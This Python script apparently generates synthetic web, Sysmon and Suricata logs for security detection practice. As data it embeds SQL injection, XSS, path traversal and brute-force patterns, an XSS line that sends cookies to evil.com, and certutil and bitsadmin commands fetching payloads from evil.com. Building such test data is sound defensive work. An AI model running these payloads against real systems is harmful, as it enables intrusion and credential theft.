#!/usr/bin/env python3
"""Generate sample security logs with embedded attack patterns."""

import json
import random
import uuid
from datetime import datetime, timedelta

NORMAL_IPS = ["10.0.1.50", "10.0.1.51", "10.0.1.52", "10.0.2.100", "10.0.2.101",
              "192.168.1.10", "192.168.1.11", "192.168.1.12"]
ATTACKER_IPS = ["203.0.113.42", "198.51.100.77", "185.220.101.33"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
]
ATTACK_UA = "sqlmap/1.7.12#stable (https://sqlmap.org)"

NORMAL_PATHS = ["/", "/index.html", "/about", "/contact", "/api/users", "/api/products",
                "/css/style.css", "/js/app.js", "/images/logo.png", "/dashboard",
                "/api/status", "/health", "/login", "/logout", "/profile"]

SQLI_PAYLOADS = [
    "/login?username=admin'%20OR%20'1'%3D'1'--&password=x",
    "/api/users?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
    "/search?q=test'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--",
    "/api/products?category=1;DROP%20TABLE%20users--",
    "/login?username=admin'--&password=anything",
    "/api/users?id=1%20AND%20SLEEP(5)--",
    "/search?q='%20OR%201=1%20--",
    "/api/users?id=1'%20AND%20(SELECT%20COUNT(*)%20FROM%20users)>0--",
    "/login?username=%27%20OR%20%271%27%3D%271&password=%27%20OR%20%271%27%3D%271",
    "/api/data?filter=1%20UNION%20ALL%20SELECT%20credit_card%20FROM%20payments--",
]

XSS_PAYLOADS = [
    "/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E",
    "/comment?text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "/profile?name=%3Csvg%20onload%3Dalert(document.cookie)%3E",
    "/api/post?body=javascript:alert('XSS')",
    "/search?q=%3Cscript%3Edocument.location%3D'http://evil.com/steal%3Fc%3D'%2Bdocument.cookie%3C/script%3E",
]

PATH_TRAVERSAL = [
    "/download?file=../../../etc/passwd",
    "/api/files?path=..%2F..%2F..%2Fetc%2Fshadow",
    "/include?page=....//....//etc/passwd",
]

BASE_TIME = datetime(2026, 3, 26, 9, 0, 0)


def fmt_time(dt):
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0900")


def gen_web_access_log():
    lines = []

    # Normal traffic (500 lines)
    for i in range(500):
        t = BASE_TIME + timedelta(seconds=random.randint(0, 21600))
        ip = random.choice(NORMAL_IPS)
        path = random.choice(NORMAL_PATHS)
        method = "GET" if path.startswith(("/css", "/js", "/images")) else random.choice(["GET", "POST"])
        status = random.choices([200, 301, 304, 404], weights=[80, 5, 10, 5])[0]
        size = random.randint(200, 50000)
        ua = random.choice(USER_AGENTS)
        lines.append(f'{ip} - - [{fmt_time(t)}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"')

    # SQLi attacks (10 lines)
    for payload in SQLI_PAYLOADS:
        t = BASE_TIME + timedelta(hours=2, minutes=random.randint(0, 30))
        ip = random.choice(ATTACKER_IPS)
        status = random.choice([200, 500, 403])
        lines.append(f'{ip} - - [{fmt_time(t)}] "GET {payload} HTTP/1.1" {status} {random.randint(100, 5000)} "-" "{ATTACK_UA}"')

    # XSS attacks (5 lines)
    for payload in XSS_PAYLOADS:
        t = BASE_TIME + timedelta(hours=3, minutes=random.randint(0, 20))
        ip = random.choice(ATTACKER_IPS)
        lines.append(f'{ip} - - [{fmt_time(t)}] "GET {payload} HTTP/1.1" 200 {random.randint(500, 3000)} "-" "{random.choice(USER_AGENTS)}"')

    # Brute-force (100 lines)
    bf_ip = "198.51.100.77"
    for i in range(100):
        t = BASE_TIME + timedelta(hours=4, seconds=i * 2)
        status = 401 if i < 95 else 200
        lines.append(f'{bf_ip} - - [{fmt_time(t)}] "POST /login HTTP/1.1" {status} {random.randint(100, 500)} "-" "{random.choice(USER_AGENTS)}"')

    # Path Traversal (3 lines)
    for payload in PATH_TRAVERSAL:
        t = BASE_TIME + timedelta(hours=5, minutes=random.randint(0, 15))
        ip = ATTACKER_IPS[0]
        lines.append(f'{ip} - - [{fmt_time(t)}] "GET {payload} HTTP/1.1" 403 {random.randint(200, 500)} "-" "{random.choice(USER_AGENTS)}"')

    random.shuffle(lines)
    return "\n".join(lines)


def gen_sysmon_log():
    events = []

    # Normal process events (200)
    normal_procs = [
        ("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\services.exe", "-k netsvcs"),
        ("C:\\Windows\\System32\\conhost.exe", "C:\\Windows\\System32\\cmd.exe", "0xffffffff -ForceV1"),
        ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Windows\\explorer.exe", "--type=renderer"),
        ("C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\explorer.exe", "document.txt"),
        ("C:\\Program Files\\Python310\\python.exe", "C:\\Windows\\System32\\cmd.exe", "app.py"),
    ]
    for i in range(200):
        t = BASE_TIME + timedelta(seconds=random.randint(0, 21600))
        proc = random.choice(normal_procs)
        events.append({
            "EventID": 1, "UtcTime": t.strftime("%Y-%m-%d %H:%M:%S.%f")[:23],
            "ProcessId": random.randint(1000, 9999),
            "Image": proc[0], "ParentImage": proc[1], "CommandLine": f"{proc[0]} {proc[2]}",
            "User": "DESKTOP-LAB\\user01",
            "SourceIp": f"10.0.1.{random.randint(50,55)}",
            "DestinationIp": "", "DestinationPort": 0,
        })

    # Suspicious process creation (20)
    suspicious_cmds = [
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami"),
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c net user"),
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c ipconfig /all"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -enc SQBFAFgA"),
        ("C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://evil.com/payload.exe"),
        ("C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin /transfer /download http://evil.com/mal.exe"),
        ("C:\\Windows\\System32\\mshta.exe", "mshta.exe vbscript:Execute(\"CreateObject(...)\")"),
    ]
    for i in range(20):
        t = BASE_TIME + timedelta(hours=3, minutes=random.randint(0, 60))
        cmd = random.choice(suspicious_cmds)
        events.append({
            "EventID": 1, "UtcTime": t.strftime("%Y-%m-%d %H:%M:%S.%f")[:23],
            "ProcessId": random.randint(5000, 9999),
            "Image": cmd[0], "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": cmd[1], "User": "DESKTOP-LAB\\admin",
            "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0,
        })

    # Suspicious network connections (10)
    for i in range(10):
        t = BASE_TIME + timedelta(hours=4, minutes=random.randint(0, 30))
        events.append({
            "EventID": 3, "UtcTime": t.strftime("%Y-%m-%d %H:%M:%S.%f")[:23],
            "ProcessId": random.randint(5000, 9999),
            "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "",
            "CommandLine": "", "User": "DESKTOP-LAB\\admin",
            "SourceIp": "10.0.1.50", "DestinationIp": "185.220.101.33",
            "DestinationPort": random.choice([4444, 5555, 8888, 1234]),
        })

    return "\n".join(json.dumps(e, ensure_ascii=False) for e in events)


def gen_suricata_log():
    events = []

    # Normal flow events (100)
    for i in range(100):
        t = BASE_TIME + timedelta(seconds=random.randint(0, 21600))
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.%f+0900"),
            "event_type": "flow",
            "src_ip": random.choice(NORMAL_IPS), "src_port": random.randint(1024, 65535),
            "dest_ip": "10.0.0.1", "dest_port": random.choice([80, 443, 8080]),
            "proto": "TCP",
            "flow": {"pkts_toserver": random.randint(5, 50), "bytes_toserver": random.randint(500, 10000)},
        })

    # Port scan alerts (30)
    scan_ip = "203.0.113.42"
    for i in range(30):
        t = BASE_TIME + timedelta(hours=2, seconds=i * 3)
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.%f+0900"),
            "event_type": "alert",
            "src_ip": scan_ip, "src_port": random.randint(40000, 60000),
            "dest_ip": "10.0.0.1", "dest_port": random.randint(1, 1024),
            "proto": "TCP",
            "alert": {
                "action": "allowed", "signature_id": 2100498,
                "signature": f"GPL SCAN nmap TCP",
                "category": "Attempted Information Leak", "severity": 2,
            },
        })

    # Attack signature alerts (20)
    sigs = [
        (2210000, "ET WEB_SERVER SQL Injection Attempt", "Web Application Attack", 1),
        (2210001, "ET WEB_SERVER XSS Attempt", "Web Application Attack", 1),
        (2210002, "ET WEB_SERVER Path Traversal Attempt", "Web Application Attack", 1),
        (2260000, "ET MALWARE Possible Trojan C2 Activity", "A Network Trojan was Detected", 1),
        (2270000, "ET EXPLOIT CVE-2024-XXXX RCE Attempt", "Attempted Administrator Privilege Gain", 1),
    ]
    for i in range(20):
        t = BASE_TIME + timedelta(hours=3, minutes=random.randint(0, 120))
        sig = random.choice(sigs)
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.%f+0900"),
            "event_type": "alert",
            "src_ip": random.choice(ATTACKER_IPS), "src_port": random.randint(1024, 65535),
            "dest_ip": "10.0.0.1", "dest_port": random.choice([80, 443, 8080]),
            "proto": "TCP",
            "alert": {
                "action": "allowed", "signature_id": sig[0],
                "signature": sig[1], "category": sig[2], "severity": sig[3],
            },
        })

    return "\n".join(json.dumps(e, ensure_ascii=False) for e in events)


if __name__ == "__main__":
    with open("sample-logs/web-access.log", "w") as f:
        f.write(gen_web_access_log())
    print("Generated: sample-logs/web-access.log (618 lines)")

    with open("sample-logs/sysmon.json", "w") as f:
        f.write(gen_sysmon_log())
    print("Generated: sample-logs/sysmon.json (230 lines)")

    with open("sample-logs/suricata-eve.json", "w") as f:
        f.write(gen_suricata_log())
    print("Generated: sample-logs/suricata-eve.json (150 lines)")
